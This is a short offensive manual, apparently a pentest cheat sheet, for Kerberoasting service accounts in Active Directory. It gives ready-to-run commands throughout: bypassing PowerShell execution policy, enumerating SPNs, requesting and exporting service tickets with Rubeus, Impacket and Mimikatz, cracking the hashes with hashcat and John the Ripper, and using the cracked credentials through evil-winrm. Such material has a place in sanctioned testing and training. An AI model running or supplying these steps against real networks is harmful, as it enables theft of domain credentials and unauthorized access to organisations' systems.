# Kerberoasting Manual Attack

Kerberoasting is a post-exploitation technique used to extract and crack service account credentials in Active Directory environments. Below is a streamlined, duplicate-free, cleaned version of the full guide.

---

## 1. Bypass PowerShell Execution Policy

```powershell
powershell -ep bypass
```

---

## 2. Import PowerView

```powershell
. .\PowerView.ps1
```

---

## 3. Identify Service Accounts with SPNs

```powershell
Get-NetUser | Where-Object {$_.servicePrincipalName} | fl
```

or:

```powershell
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
```

---

## 4. Enumerate SPNs in the Domain

```powershell
setspn -T research -Q */*
```

---

## 5. Check Existing Kerberos Tickets

```powershell
klist
```

---

## 6. Request a TGS Ticket

### PowerShell method:

```powershell
Add-Type -AssemblyName System.IdentityModel
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "ops/research.SECURITY.local:1434"
```

### Impacket:

```bash
GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>:<PASSWORD> -request
```

### Rubeus:

```powershell
Rubeus.exe kerberoast
```

---

## 7. Extract Kerberos Tickets

### Using Mimikatz:

```powershell
. .\Invoke-Mimikatz.ps1
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

### Using Rubeus:

```powershell
Rubeus.exe kerberoast /format:hashcat
```

### Using PowerView:

```powershell
Invoke-Kerberoast | Format-Table -AutoSize
```

---

## 8. Crack Extracted Hashes

### Hashcat:

```bash
hashcat -m 13100 <hashfile> <wordlist>
```

### John the Ripper:

```bash
john --format=krb5tgs --wordlist=<wordlist> <hashfile>
```

---

## 9. Test Access with Cracked Credentials

### PowerShell:

```powershell
New-PSSession -ComputerName <Target> -Credential <DOMAIN>\<User>
```

### Evil-WinRM:

```bash
evil-winrm -i <Target_IP> -u <User> -p <Password>
```

---

## 10. Verifying Extracted Ticket Files (Optional)

```bash
strings <TGS_FILE> | head
hexdump -C <TGS_FILE> | less
```

---

## 11. Running in Restricted Shells (Optional)

```bash
python3 -c "import os; os.system('GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER>')"
```

```bash
nohup python3 GetUserSPNs.py -dc-ip <DC_IP> <DOMAIN>/<USER> -request &
```

---

## 12. Alternative Enumeration Tools

### kerbrute:

```bash
./kerbrute userenum -d <DOMAIN> --dc <DC_IP> userlist.txt
```

### BloodHound:

```bash
neo4j console &
bloodhound-python -u <USER> -p <PASSWORD> -d <DOMAIN> -c All
```
